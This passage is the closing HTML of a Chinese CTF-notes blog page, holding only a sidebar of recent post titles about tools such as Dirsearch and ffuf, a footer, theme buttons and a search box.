fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="/js/tw_cn.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
